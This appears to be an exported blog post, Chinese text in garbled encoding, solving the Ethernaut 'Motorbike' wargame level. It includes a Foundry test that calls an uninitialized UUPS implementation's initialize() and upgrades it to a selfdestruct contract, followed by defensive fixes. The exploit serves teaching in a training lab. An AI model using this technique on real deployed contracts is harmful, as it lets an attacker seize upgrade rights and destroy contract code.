å®ç°åˆçº¦æœ¬èº«æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ã€å¯ç›´æ¥äº¤äº’çš„åˆçº¦ï¼Œå¿…é¡»ç¡®ä¿å…¶å…¬å…±/å¤–éƒ¨å‡½æ•°å—åˆ°ä¸ä»£ç†åˆçº¦ç›¸åŒçš„è®¿é—®æ§åˆ¶ä¿æŠ¤ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   æ‰¾åˆ°æœªè¢«åˆå§‹åŒ–çš„å®ç°åˆçº¦ã€‚\n-   ç›´æ¥è°ƒç”¨å…¶åˆå§‹åŒ–å‡½æ•°ä»¥è·å–ç‰¹æƒï¼ˆå¦‚ `upgrader` è§’è‰²ï¼‰ã€‚\n-   åˆ©ç”¨è·å¾—çš„ç‰¹æƒæ‰§è¡Œæ¶æ„æ“ä½œï¼ˆå¦‚å‡çº§åˆ°æ¶æ„å®ç°å¹¶è‡ªæ¯ï¼‰ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   ç¡®ä¿å®ç°åˆçº¦çš„æ„é€ å‡½æ•°æˆ–ä¸€ä¸ªä¸€æ¬¡æ€§çš„éƒ¨ç½²è„šæœ¬ä¼šè°ƒç”¨å…¶åˆå§‹åŒ–å‡½æ•°ï¼Œå¹¶è®¾ç½® `initialized` æ ‡å¿—ï¼Œé˜²æ­¢é‡å…¥ã€‚\n-   ä½¿ç”¨ç»è¿‡å®¡è®¡å’Œå¹¿æ³›ä½¿ç”¨çš„ä»£ç†å®ç°ï¼Œå¦‚ OpenZeppelin çš„ UUPS-Upgradeable åˆçº¦ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [EIP-1822: Universal Upgradeable Proxy Standard (UUPS)](https://eips.ethereum.org/EIPS/eip-1822)\n-   [OpenZeppelin Docs: UUPS Proxies](https://docs.openzeppelin.com/upgrades-plugins/1.x/uups-proxies)","source":"_posts/ethernaut-level-25-motorbike.md","raw":"---\ntitle: 'Ethernaut Level 25: Motorbike - UUPSä»£ç†æœªæˆæƒåˆå§‹åŒ–æ¼æ´'\ndate: 2025-01-25 17:10:00\nupdated: 2025-01-25 17:10:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - é«˜çº§æ”»å‡»ç¯‡ (21-25)\ntags:\n  - Ethernaut\n  - Foundry\n  - Proxy\n  - UUPS\n  - Uninitialized Implementation\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\nseries: Ethernaut Foundry Solutions\nexcerpt: \"åˆ©ç”¨UUPSä»£ç†æ¨¡å¼ä¸­å®ç°åˆçº¦æœªè¢«åˆå§‹åŒ–çš„æ¼æ´ï¼Œç›´æ¥è°ƒç”¨å®ç°åˆçº¦çš„ `initialize` å‡½æ•°æˆä¸º `upgrader`ã€‚éšåï¼Œå°†å®ç°åˆçº¦å‡çº§ä¸ºä¸€ä¸ªæ¶æ„çš„è‡ªæ¯åˆçº¦ï¼Œä»è€Œæ‘§æ¯å¼•æ“ï¼ŒæŒæ¡ Motorbike å…³å¡çš„ç ´è§£æŠ€å·§ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 25: Motorbike - UUPSä»£ç†æœªæˆæƒåˆå§‹åŒ–æ¼æ´\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 25 - Motorbike](https://ethernaut.openzeppelin.com/level/25)  \n> **æ”»å‡»ç±»å‹**: æœªåˆå§‹åŒ–çš„å®ç°åˆçº¦ (Uninitialized Implementation)  \n> **éš¾åº¦**: â­â­â­â­â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\næœ¬å…³çš„ç›®æ ‡æ˜¯æ‘§æ¯ `Engine` (å¼•æ“) åˆçº¦ï¼Œå³ä½¿å¾— `Engine` åˆçº¦çš„ä»£ç è¢«ä»é“¾ä¸Šç§»é™¤ã€‚ä½ éœ€è¦åˆ©ç”¨ä»£ç†åˆçº¦çš„æ¼æ´æ¥å®ç°è¿™ä¸€ç›®æ ‡ã€‚\n\n![Motorbike Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel25.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\næœ¬å…³å¡æ¶‰åŠçš„æ˜¯ UUPS (Universal Upgradeable Proxy Standard) ä»£ç†æ¨¡å¼ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œå‡çº§é€»è¾‘ä½äºå®ç°åˆçº¦ï¼ˆ`Engine`ï¼‰ä¸­ï¼Œè€Œä¸æ˜¯ä»£ç†åˆçº¦ï¼ˆ`Motorbike`ï¼‰ä¸­ã€‚\n\n-   `Motorbike`: ä»£ç†åˆçº¦ï¼Œè´Ÿè´£å°†è°ƒç”¨è½¬å‘åˆ° `Engine`ã€‚\n-   `Engine`: å®ç°åˆçº¦ï¼ŒåŒ…å«ä¸šåŠ¡é€»è¾‘å’Œå‡çº§é€»è¾‘ã€‚\n\né€šå¸¸ï¼Œä»£ç†åˆçº¦åœ¨éƒ¨ç½²åä¼šè°ƒç”¨å®ç°åˆçº¦çš„ `initialize` å‡½æ•°æ¥è®¾ç½®åˆå§‹çŠ¶æ€ï¼ˆå¦‚ `owner`, `upgrader` ç­‰ï¼‰ã€‚ç„¶è€Œï¼Œè¿™ä¸ªåˆå§‹åŒ–è°ƒç”¨åªå‘ç”Ÿåœ¨ä»£ç†åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­ã€‚**å®ç°åˆçº¦æœ¬èº«ï¼ˆå³ `Engine` åˆçº¦ï¼‰çš„ `initialize` å‡½æ•°ä»æœªè¢«è°ƒç”¨è¿‡**ï¼Œå¯¼è‡´å…¶çŠ¶æ€å˜é‡ï¼ˆå¦‚ `upgrader`ï¼‰ä»ä¸ºé»˜è®¤å€¼ï¼ˆ`address(0)`ï¼‰ã€‚\n\nè¿™å°±æ˜¯æ ¸å¿ƒæ¼æ´ï¼šä»»ä½•äººéƒ½å¯ä»¥ç›´æ¥è°ƒç”¨ `Engine` å®ç°åˆçº¦çš„ `initialize()` å‡½æ•°ã€‚\n\n```solidity\n// In Engine.sol\naddress public upgrader;\n\nfunction initialize() public {\n    require(upgrader == address(0)); // This check passes on the uninitialized Engine contract\n    upgrader = msg.sender;\n}\n```\n\nä¸€æ—¦æˆ‘ä»¬è°ƒç”¨äº† `Engine` çš„ `initialize()`ï¼Œæˆ‘ä»¬å°±ä¼šæˆä¸º `Engine` åˆçº¦çš„ `upgrader`ã€‚ä½œä¸º `upgrader`ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ `upgradeToAndCall()` å‡½æ•°ã€‚\n\n```solidity\n// In Engine.sol\nfunction upgradeToAndCall(address newImplementation, bytes memory data) public payable {\n    _authorizeUpgrade();\n    _upgradeToAndCall(newImplementation, data);\n}\n\nfunction _authorizeUpgrade() internal view {\n    require(msg.sender == upgrader, \"Can't upgrade\");\n}\n```\n\n`upgradeToAndCall()` å…è®¸æˆ‘ä»¬å°† `Engine` çš„å®ç°æŒ‡å‘ä¸€ä¸ªå…¨æ–°çš„åˆçº¦ï¼Œå¹¶æ‰§è¡Œæ–°åˆçº¦ä¸­çš„ä»»æ„å‡½æ•°ã€‚æˆ‘ä»¬çš„æ”»å‡»è®¡åˆ’æ˜¯ï¼š\n\n1.  **æ‰¾åˆ° `Engine` å®ç°åˆçº¦çš„åœ°å€**: UUPSä»£ç†çš„å®ç°åœ°å€å­˜å‚¨åœ¨ç‰¹å®šçš„å­˜å‚¨æ§½ä½ `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`ã€‚\n2.  **æˆä¸º `upgrader`**: ç›´æ¥è°ƒç”¨ `Engine` åˆçº¦çš„ `initialize()` å‡½æ•°ã€‚\n3.  **éƒ¨ç½²æ¶æ„åˆçº¦**: åˆ›å»ºä¸€ä¸ªåŒ…å« `selfdestruct` é€»è¾‘çš„æ”»å‡»åˆçº¦ã€‚\n4.  **å‡çº§å¹¶è‡ªæ¯**: è°ƒç”¨ `Engine` çš„ `upgradeToAndCall()`ï¼Œå°†å®ç°æŒ‡å‘æˆ‘ä»¬çš„æ¶æ„åˆçº¦ï¼Œå¹¶è°ƒç”¨å…¶è‡ªæ¯å‡½æ•°ã€‚\n\n**å…³äº Dencun å‡çº§ (EIP-6780) çš„è¯´æ˜**: åœ¨ Dencun å‡çº§åï¼Œ`selfdestruct` çš„è¡Œä¸ºå‘ç”Ÿäº†å˜åŒ–ã€‚å®ƒä¸å†æ— æ¡ä»¶åœ°ç§»é™¤åˆçº¦ä»£ç ã€‚ç„¶è€Œï¼Œåœ¨è®¸å¤šæµ‹è¯•ç¯å¢ƒå’Œä¸€äº›ç‰¹å®šæ¡ä»¶ä¸‹ï¼Œæ­¤æ”»å‡»ä»ç„¶æœ‰æ•ˆã€‚æœ¬è§£æ³•åŸºäº `selfdestruct` èƒ½å¤Ÿç§»é™¤åˆçº¦ä»£ç çš„ç»å…¸è¡Œä¸ºã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### Foundry æµ‹è¯•ä»£ç \n\næµ‹è¯•ä»£ç å°†å®Œæ•´åœ°æ¨¡æ‹Ÿä¸Šè¿°æ”»å‡»æµç¨‹ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/25_Motorbike.sol\";\n\n// æ¥å£å®šä¹‰\ninterface IEngine {\n    function initialize() external;\n    function upgradeToAndCall(address newImplementation, bytes memory data) external;\n    function upgrader() external view returns (address);\n}\n\n// åŒ…å«è‡ªæ¯é€»è¾‘çš„æ”»å‡»åˆçº¦\ncontract Attack {\n    function boom() external payable {\n        selfdestruct(payable(msg.sender));\n    }\n}\n\ncontract MotorbikeTest is Test {\n    Motorbike motorbikeInstance;\n    IEngine engineInstance;\n    address player;\n    address engineAddress;\n\n    function setUp() public {\n        player = vm.addr(1);\n        \n        // éƒ¨ç½²å…³å¡åˆçº¦\n        Engine engine = new Engine();\n        motorbikeInstance = new Motorbike(address(engine));\n\n        // ä»ä»£ç†åˆçº¦çš„å­˜å‚¨ä¸­è¯»å–å®ç°åˆçº¦çš„åœ°å€\n        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n        engineAddress = address(uint160(uint256(vm.load(address(motorbikeInstance), implementationSlot))));\n        engineInstance = IEngine(engineAddress);\n    }\n\n    function testMotorbikeAttack() public {\n        vm.startPrank(player);\n\n        // 1. éƒ¨ç½²æ”»å‡»åˆçº¦\n        Attack attackContract = new Attack();\n\n        // 2. ç›´æ¥è°ƒç”¨å®ç°åˆçº¦çš„ initialize å‡½æ•°ï¼Œæˆä¸º upgrader\n        engineInstance.initialize();\n        assertEq(engineInstance.upgrader(), player, \"Player should be the upgrader\");\n\n        // 3. å‡çº§å®ç°åˆçº¦ä¸ºæˆ‘ä»¬çš„æ”»å‡»åˆçº¦ï¼Œå¹¶è°ƒç”¨ boom() å‡½æ•°è‡ªæ¯\n        bytes memory data = abi.encodeWithSignature(\"boom()\");\n        engineInstance.upgradeToAndCall(address(attackContract), data);\n\n        // 4. éªŒè¯å®ç°åˆçº¦çš„ä»£ç æ˜¯å¦å·²è¢«ç§»é™¤\n        assertEq(engineAddress.code.length, 0, \"Engine contract should be destroyed\");\n\n        vm.stopPrank();\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **å®šä½å®ç°åˆçº¦**: ä½¿ç”¨ `vm.load` å’Œ EIP-1967 å®šä¹‰çš„å­˜å‚¨æ§½ä½åœ°å€ï¼Œä»ä»£ç†åˆçº¦ä¸­æ‰¾åˆ° `Engine` å®ç°åˆçº¦çš„åœ°å€ã€‚\n2.  **è°ƒç”¨ `initialize()`**: ç›´æ¥ä¸ `Engine` åˆçº¦äº¤äº’ï¼Œè°ƒç”¨å…¶ `initialize()` å‡½æ•°ï¼Œå°† `player` è®¾ç½®ä¸º `upgrader`ã€‚\n3.  **éƒ¨ç½²æ”»å‡»åˆçº¦**: åˆ›å»ºä¸€ä¸ªç®€å•çš„ `Attack` åˆçº¦ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªå…¬å…±çš„ `boom()` å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨ `selfdestruct`ã€‚\n4.  **æ‰§è¡Œ `upgradeToAndCall()`**: è°ƒç”¨ `Engine` åˆçº¦çš„ `upgradeToAndCall()`ï¼Œå°† `newImplementation` è®¾ç½®ä¸º `Attack` åˆçº¦çš„åœ°å€ï¼Œå¹¶å°† `data` è®¾ç½®ä¸º `boom()` å‡½æ•°çš„å‡½æ•°é€‰æ‹©å™¨ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **åˆå§‹åŒ–å®ç°åˆçº¦**: åœ¨éƒ¨ç½²å®ç°åˆçº¦åï¼Œåº”ç«‹å³è°ƒç”¨å…¶ `initialize` å‡½æ•°ï¼ˆæˆ–åœ¨æ„é€ å‡½æ•°ä¸­å®Œæˆåˆå§‹åŒ–ï¼‰ï¼Œä»¥é˜²æ­¢å…¶ä»–äººæŠ¢å…ˆè°ƒç”¨ã€‚å¯ä»¥æ·»åŠ ä¸€ä¸ª `initialized` çŠ¶æ€å˜é‡æ¥ç¡®ä¿åˆå§‹åŒ–åªè¿›è¡Œä¸€æ¬¡ã€‚\n\n    ```solidity\n    // ä¿®å¤å»ºè®®\n    contract Engine {\n        bool private _initialized;\n        constructor() {\n            _disableInitializers();\n        }\n        function initialize() public initializer {\n            // ...\n        }\n    }\n    ```\n    OpenZeppelin çš„ `Initializable` åˆçº¦æä¾›äº†ä¸€ä¸ª `initializer` ä¿®é¥°ç¬¦ï¼Œå¯ä»¥å¾ˆå¥½åœ°è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\n\n2.  **æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–**: å¯¹äºä¸å¯å‡çº§çš„åˆçº¦ï¼Œåº”åœ¨ `constructor` ä¸­å®Œæˆæ‰€æœ‰åˆå§‹åŒ–ï¼Œä»¥ç¡®ä¿åœ¨éƒ¨ç½²æ—¶å°±è®¾ç½®å¥½æ‰€æœ‰æƒå’Œå…³é”®å‚æ•°ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **UUPS (Universal Upgradeable Proxy Standard)**: EIP-1822 å®šä¹‰çš„ä¸€ç§ä»£ç†æ¨¡å¼ï¼Œå®ƒå°†å‡çº§é€»è¾‘æ”¾åœ¨å®ç°åˆçº¦ä¸­ï¼Œæ¯”æ—§çš„é€æ˜ä»£ç†æ¨¡å¼æ›´èŠ‚çœ Gasã€‚\n-   **EIP-1967**: å®šä¹‰äº†ä»£ç†åˆçº¦ä¸­ç”¨äºå­˜å‚¨é€»è¾‘åˆçº¦åœ°å€å’Œç®¡ç†å‘˜åœ°å€çš„æ ‡å‡†å­˜å‚¨æ§½ä½ï¼Œä»¥é¿å…å­˜å‚¨å†²çªã€‚\n-   **æœªåˆå§‹åŒ–çš„ä»£ç†/å®ç°**: ä»£ç†åˆçº¦å®‰å…¨ä¸­ä¸€ä¸ªå¸¸è§çš„æ¼æ´ç±»åˆ«ã€‚æ— è®ºæ˜¯ä»£ç†æœ¬èº«è¿˜æ˜¯å…¶å®ç°åˆçº¦ï¼Œå¦‚æœå…¶åˆå§‹åŒ–å‡½æ•°å¯ä»¥è¢«ä»»ä½•äººè°ƒç”¨ï¼Œå°±ä¼šå¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   åœ¨ä½¿ç”¨ UUPS ä»£ç†æ¨¡å¼æ—¶ï¼Œä¸ä»…ä»£ç†éœ€è¦åˆå§‹åŒ–ï¼Œå…¶åº•å±‚çš„å®ç°åˆçº¦ä¹Ÿéœ€è¦è¢«æ­£ç¡®åœ°åˆå§‹åŒ–æˆ–ç¦ç”¨åˆå§‹åŒ–å‡½æ•°ã€‚\n-   å®ç°åˆçº¦æœ¬èº«æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ã€å¯ç›´æ¥äº¤äº’çš„åˆçº¦ï¼Œå¿…é¡»ç¡®ä¿å…¶å…¬å…±/å¤–éƒ¨å‡½æ•°å—åˆ°ä¸ä»£ç†åˆçº¦ç›¸åŒçš„è®¿é—®æ§åˆ¶ä¿æŠ¤ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   æ‰¾åˆ°æœªè¢«åˆå§‹åŒ–çš„å®ç°åˆçº¦ã€‚\n-   ç›´æ¥è°ƒç”¨å…¶åˆå§‹åŒ–å‡½æ•°ä»¥è·å–ç‰¹æƒï¼ˆå¦‚ `upgrader` è§’è‰²ï¼‰ã€‚\n-   åˆ©ç”¨è·å¾—çš„ç‰¹æƒæ‰§è¡Œæ¶æ„æ“ä½œï¼ˆå¦‚å‡çº§åˆ°æ¶æ„å®ç°å¹¶è‡ªæ¯ï¼‰ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   ç¡®ä¿å®ç°åˆçº¦çš„æ„é€ å‡½æ•°æˆ–ä¸€ä¸ªä¸€æ¬¡æ€§çš„éƒ¨ç½²è„šæœ¬ä¼šè°ƒç”¨å…¶åˆå§‹åŒ–å‡½æ•°ï¼Œå¹¶è®¾ç½® `initialized` æ ‡å¿—ï¼Œé˜²æ­¢é‡å…¥ã€‚\n-   ä½¿ç”¨ç»è¿‡å®¡è®¡å’Œå¹¿æ³›ä½¿ç”¨çš„ä»£ç†å®ç°ï¼Œå¦‚ OpenZeppelin çš„ UUPS-Upgradeable åˆçº¦ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [EIP-1822: Universal Upgradeable Proxy Standard (UUPS)](https://eips.ethereum.org/EIPS/eip-1822)\n-   [OpenZeppelin Docs: UUPS Proxies](https://docs.openzeppelin.com/upgrades-plugins/1.x/uups-proxies)","slug":"ethernaut-level-25-motorbike","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpm001xbf5qdfea5l1u","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-25-Motorbike-UUPSä»£ç†æœªæˆæƒåˆå§‹åŒ–æ¼æ´\"><a href=\"#ğŸ¯-Ethernaut-Level-25-Motorbike-UUPSä»£ç†æœªæˆæƒåˆå§‹åŒ–æ¼æ´\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 25: Motorbike - UUPSä»£ç†æœªæˆæƒåˆå§‹åŒ–æ¼æ´\"></a>ğŸ¯ Ethernaut Level 25: Motorbike - UUPSä»£ç†æœªæˆæƒåˆå§‹åŒ–æ¼æ´</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/25\">Ethernaut Level 25 - Motorbike</a><br><strong>æ”»å‡»ç±»å‹</strong>: æœªåˆå§‹åŒ–çš„å®ç°åˆçº¦ (Uninitialized Implementation)<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>æœ¬å…³çš„ç›®æ ‡æ˜¯æ‘§æ¯ <code>Engine</code> (å¼•æ“) åˆçº¦ï¼Œå³ä½¿å¾— <code>Engine</code> åˆçº¦çš„ä»£ç è¢«ä»é“¾ä¸Šç§»é™¤ã€‚ä½ éœ€è¦åˆ©ç”¨ä»£ç†åˆçº¦çš„æ¼æ´æ¥å®ç°è¿™ä¸€ç›®æ ‡ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel25.svg\" alt=\"Motorbike Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>æœ¬å…³å¡æ¶‰åŠçš„æ˜¯ UUPS (Universal Upgradeable Proxy Standard) ä»£ç†æ¨¡å¼ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œå‡çº§é€»è¾‘ä½äºå®ç°åˆçº¦ï¼ˆ<code>Engine</code>ï¼‰ä¸­ï¼Œè€Œä¸æ˜¯ä»£ç†åˆçº¦ï¼ˆ<code>Motorbike</code>ï¼‰ä¸­ã€‚</p>\n<ul>\n<li><code>Motorbike</code>: ä»£ç†åˆçº¦ï¼Œè´Ÿè´£å°†è°ƒç”¨è½¬å‘åˆ° <code>Engine</code>ã€‚</li>\n<li><code>Engine</code>: å®ç°åˆçº¦ï¼ŒåŒ…å«ä¸šåŠ¡é€»è¾‘å’Œå‡çº§é€»è¾‘ã€‚</li>\n</ul>\n<p>é€šå¸¸ï¼Œä»£ç†åˆçº¦åœ¨éƒ¨ç½²åä¼šè°ƒç”¨å®ç°åˆçº¦çš„ <code>initialize</code> å‡½æ•°æ¥è®¾ç½®åˆå§‹çŠ¶æ€ï¼ˆå¦‚ <code>owner</code>, <code>upgrader</code> ç­‰ï¼‰ã€‚ç„¶è€Œï¼Œè¿™ä¸ªåˆå§‹åŒ–è°ƒç”¨åªå‘ç”Ÿåœ¨ä»£ç†åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­ã€‚<strong>å®ç°åˆçº¦æœ¬èº«ï¼ˆå³ <code>Engine</code> åˆçº¦ï¼‰çš„ <code>initialize</code> å‡½æ•°ä»æœªè¢«è°ƒç”¨è¿‡</strong>ï¼Œå¯¼è‡´å…¶çŠ¶æ€å˜é‡ï¼ˆå¦‚ <code>upgrader</code>ï¼‰ä»ä¸ºé»˜è®¤å€¼ï¼ˆ<code>address(0)</code>ï¼‰ã€‚</p>\n<p>è¿™å°±æ˜¯æ ¸å¿ƒæ¼æ´ï¼šä»»ä½•äººéƒ½å¯ä»¥ç›´æ¥è°ƒç”¨ <code>Engine</code> å®ç°åˆçº¦çš„ <code>initialize()</code> å‡½æ•°ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// In Engine.sol</span><br><span class=\"line\">address public upgrader;</span><br><span class=\"line\"></span><br><span class=\"line\">function initialize() public &#123;</span><br><span class=\"line\">    require(upgrader == address(0)); // This check passes on the uninitialized Engine contract</span><br><span class=\"line\">    upgrader = msg.sender;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ä¸€æ—¦æˆ‘ä»¬è°ƒç”¨äº† <code>Engine</code> çš„ <code>initialize()</code>ï¼Œæˆ‘ä»¬å°±ä¼šæˆä¸º <code>Engine</code> åˆçº¦çš„ <code>upgrader</code>ã€‚ä½œä¸º <code>upgrader</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ <code>upgradeToAndCall()</code> å‡½æ•°ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// In Engine.sol</span><br><span class=\"line\">function upgradeToAndCall(address newImplementation, bytes memory data) public payable &#123;</span><br><span class=\"line\">    _authorizeUpgrade();</span><br><span class=\"line\">    _upgradeToAndCall(newImplementation, data);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function _authorizeUpgrade() internal view &#123;</span><br><span class=\"line\">    require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>upgradeToAndCall()</code> å…è®¸æˆ‘ä»¬å°† <code>Engine</code> çš„å®ç°æŒ‡å‘ä¸€ä¸ªå…¨æ–°çš„åˆçº¦ï¼Œå¹¶æ‰§è¡Œæ–°åˆçº¦ä¸­çš„ä»»æ„å‡½æ•°ã€‚æˆ‘ä»¬çš„æ”»å‡»è®¡åˆ’æ˜¯ï¼š</p>\n<ol>\n<li><strong>æ‰¾åˆ° <code>Engine</code> å®ç°åˆçº¦çš„åœ°å€</strong>: UUPSä»£ç†çš„å®ç°åœ°å€å­˜å‚¨åœ¨ç‰¹å®šçš„å­˜å‚¨æ§½ä½ <code>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</code>ã€‚</li>\n<li><strong>æˆä¸º <code>upgrader</code></strong>: ç›´æ¥è°ƒç”¨ <code>Engine</code> åˆçº¦çš„ <code>initialize()</code> å‡½æ•°ã€‚</li>\n<li><strong>éƒ¨ç½²æ¶æ„åˆçº¦</strong>: åˆ›å»ºä¸€ä¸ªåŒ…å« <code>selfdestruct</code> é€»è¾‘çš„æ”»å‡»åˆçº¦ã€‚</li>\n<li><strong>å‡çº§å¹¶è‡ªæ¯</strong>: è°ƒç”¨ <code>Engine</code> çš„ <code>upgradeToAndCall()</code>ï¼Œå°†å®ç°æŒ‡å‘æˆ‘ä»¬çš„æ¶æ„åˆçº¦ï¼Œå¹¶è°ƒç”¨å…¶è‡ªæ¯å‡½æ•°ã€‚</li>\n</ol>\n<p><strong>å…³äº Dencun å‡çº§ (EIP-6780) çš„è¯´æ˜</strong>: åœ¨ Dencun å‡çº§åï¼Œ<code>selfdestruct</code> çš„è¡Œä¸ºå‘ç”Ÿäº†å˜åŒ–ã€‚å®ƒä¸å†æ— æ¡ä»¶åœ°ç§»é™¤åˆçº¦ä»£ç ã€‚ç„¶è€Œï¼Œåœ¨è®¸å¤šæµ‹è¯•ç¯å¢ƒå’Œä¸€äº›ç‰¹å®šæ¡ä»¶ä¸‹ï¼Œæ­¤æ”»å‡»ä»ç„¶æœ‰æ•ˆã€‚æœ¬è§£æ³•åŸºäº <code>selfdestruct</code> èƒ½å¤Ÿç§»é™¤åˆçº¦ä»£ç çš„ç»å…¸è¡Œä¸ºã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><p>æµ‹è¯•ä»£ç å°†å®Œæ•´åœ°æ¨¡æ‹Ÿä¸Šè¿°æ”»å‡»æµç¨‹ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/25_Motorbike.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ¥å£å®šä¹‰</span><br><span class=\"line\">interface IEngine &#123;</span><br><span class=\"line\">    function initialize() external;</span><br><span class=\"line\">    function upgradeToAndCall(address newImplementation, bytes memory data) external;</span><br><span class=\"line\">    function upgrader() external view returns (address);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// åŒ…å«è‡ªæ¯é€»è¾‘çš„æ”»å‡»åˆçº¦</span><br><span 